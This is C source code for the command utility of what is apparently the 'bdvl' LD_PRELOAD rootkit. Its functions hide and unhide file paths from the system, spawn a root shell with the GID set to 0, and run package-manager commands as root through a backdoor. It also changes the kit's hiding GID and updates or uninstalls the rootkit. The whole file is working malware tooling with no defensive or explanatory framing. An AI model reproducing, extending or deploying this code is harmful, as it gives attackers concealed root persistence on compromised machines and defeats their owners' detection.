void option_err(char *a0){
    printf("\e[1;31mValid commands:\e[0m\n");
    printf("  %s update bdvl.so.*\n", a0);
    printf("  %s hide/unhide <path>\n", a0);
    printf("  %s uninstall\n", a0);
    printf("  %s unhideself\n", a0);
    printf("  %s makelinks\n", a0);
#ifdef READ_GID_FROM_FILE
    printf("  %s changegid\n", a0);
#endif
#ifdef BACKDOOR_PKGMAN
    size_t tmpsize, buflen, cursize=0;
    char validmans[16*VALIDPKGMANS_SIZE];
    memset(validmans, 0, sizeof(validmans));
    for(int i = 0; i < VALIDPKGMANS_SIZE; ++i){
        tmpsize = strlen(validpkgmans[i])+2, buflen = strlen(validmans),
        cursize = buflen+tmpsize;
        if(cursize >= sizeof(validmans)-1)
            break;

        char tmp[tmpsize];
        memset(tmp, 0, tmpsize);
        snprintf(tmp, tmpsize, "%s/", validpkgmans[i]);
        strncat(validmans, tmp, tmpsize);
    }
    validmans[strlen(validmans)-1]='\0';
    printf("  %s %s <args>\n", a0, validmans);
#endif
    exit(0);
}
void do_self(void){
    printf("You are about to spawn an unhidden shell.\n");
    printf("\e[1mPress enter if you're absolutely sure. ^C to cancel.\e[0m");
    getchar();
    
    pid_t pid=fork();
    if(pid < 0){
        printf("Failed fork.\n");
        return;
    }else if(pid > 0){
        for(int i=0; i<3; i++)
            close(i);
        signal(SIGHUP, SIG_IGN);
        wait(NULL);
        return;
    }

    if(setsid() < 0){
        printf("Failed setsid.\n");
        return;
    }

    hook(CSETGID, CCHDIR);
    call(CCHDIR, "/tmp");
    unsetenv("HOME");
    call(CSETGID, 0);

    system("id");

    char *args[3];
    args[0] = "/bin/sh";
    args[1] = "-i";
    args[2] = NULL;

    printf("You're now totally visible. 'exit' when you want to return to being hidden.\n");
#ifdef SET_MAGIC_ENV_UNHIDE
    char *env[2];
    env[0] = BD_VAR"=1";
    env[1] = NULL;
    hook(CEXECVE);
    call(CEXECVE, args[0], args, env);
#else
    execl(args[0], args[1], NULL);
#endif
    exit(0);
}

void symlinkstuff(void){
    hook(CACCESS, CSYMLINK);

    char *src, *dest, *linkname;
    int ok=0, fail=0, exist=0, acc, syml;
    for(int i = 0; i < LINKSRCS_SIZE; i++){
        src = linksrcs[i];
        dest = linkdest(i);
        linkname = basename(dest);

        acc = (long)call(CACCESS, src, F_OK);
        if(acc < 0 && errno != ENOENT){
            fail++;
            printf("Something went wrong trying to access %s (\e[31m%s\e[0m)\n", src, linkname);
            free(dest);
            continue;
        }else if(acc < 0){
            free(dest);
            continue;
        }

        syml = (long)call(CSYMLINK, src, dest);
        if(syml < 0 && errno == EEXIST){
            exist++;
            free(dest);
            continue;
        }else if(syml < 0){
            fail++;
            printf("Failed linking: %s -> ~/\e[31m%s\e[0m\n", src, linkname);
        }else ok++;
        free(dest);
    }

    if(ok > 0) printf("\e[1mSuccessful links: \e[1;31m%d\e[0m\n", ok);
    if(exist > 0) printf("\e[1mLinks already exist: \e[1;31m%d\e[0m\n", exist);
    if(fail > 0) printf("\e[1mFailed links: \e[1;31m%d\e[0m\n", fail);
}

/* everything in here calls to misc rootkit utils. */
void dobdvutil(char *const argv[]){
    char *option, *path;
    int path_status;

    option = argv[1];
    if(option == NULL)
        option_err(argv[0]);

#ifdef BACKDOOR_PKGMAN
    char *pkgman;
    for(int pkgmani = 0; pkgmani < VALIDPKGMANS_SIZE; pkgmani++){
        pkgman = validpkgmans[pkgmani];

        if(!strcmp(pkgman, option)){
            char argbuf[256];
            memset(argbuf, 0, sizeof(argbuf));
            
            size_t tmpsize, buflen;
            for(int argi = 1; argv[argi] != NULL; argi++){
                tmpsize = strlen(argv[argi])+2;
                buflen = strlen(argbuf);

                if(buflen+tmpsize >= sizeof(argbuf)-1)
                    break;

                char tmp[tmpsize];
                memset(tmp, 0, tmpsize);
                snprintf(tmp, tmpsize, "%s ", argv[argi]);
                strncat(argbuf, tmp, tmpsize);
            }
            argbuf[strlen(argbuf)-1]='\0';

            printf("system(\"%s\")\n", argbuf);
            printf("This process \e[1;31mwill not\e[0m be hidden.\n");
            printf("Press enter to confirm.");
            getchar();

            pid_t pid = fork();
            if(pid > 0){
                for(int i=0; i<3; i++)
                    close(i);
                signal(SIGHUP, SIG_IGN);
                wait(NULL);
            }
            if(pid == 0){
                signal(SIGHUP, SIG_IGN);
                hook(CSETGID, CCHDIR);
                setuid(0);
                call(CSETGID, 0);
                putenv("HOME=/tmp");
                putenv(BD_VAR"=1");
                call(CCHDIR, "/tmp");
                system("id");
                system(argbuf);
                wait(NULL);
            }
            exit(0);
        }
    }
#endif

#ifdef READ_GID_FROM_FILE
    if(!strcmp("changegid", option)){
        printf("Changing kit GID. You must \e[1;31mreconnect\e[0m once it has changed.\n");
        printf("Make sure you don't have any other \e[1;31mprocesses running\e[0m other than this.\n");
        printf("Current GID: \e[1;31m%u\e[0m\n", getgid());
        printf("Press enter to confirm.");
        getchar();
        
        gid_t newgid = changerkgid(time(NULL));
        printf("New GID: \e[1;31m%u\e[0m\n", newgid);

        hook(CKILL);
        call(CKILL, getppid(), SIGKILL);
        call(CKILL, getpid(), SIGKILL);
        exit(0);
    }
#endif

    if(!strcmp("update", option)){
        bdvupdate(argv);
        exit(0);
    }

    if(!strcmp("uninstall", option)){
        uninstallbdv();
        hook(CKILL);
        call(CKILL, getppid(), SIGKILL);
        call(CKILL, getpid(), SIGKILL);
        exit(0);
    }

    if(!strcmp("unhideself", option)){
        do_self();
        exit(0);
    }

    if(!strcmp("makelinks", option)){
        symlinkstuff();
        exit(0);
    }

    path = argv[2];
    if(path == NULL)
        option_err(argv[0]);

    hook(CACCESS);
    path_status = (long)call(CACCESS, path, F_OK);
    if(path_status != 0){
        printf("%s\n", ERR_ACSS_PATH);
        exit(-1);
    }

    /* hide or unhide given path */
    if(!strncmp("hide", option, 4)){
        switch(hide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_HIDDEN_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_HIDDEN_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_HIDING_PATH);
                break;
        }
    }else if(!strncmp("unhide", option, 6)){
        switch(unhide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_VISIBLE_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_VISIBLE_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_UNHIDING_PATH);
                break;
        }
    }else option_err(argv[0]);

    exit(0);
}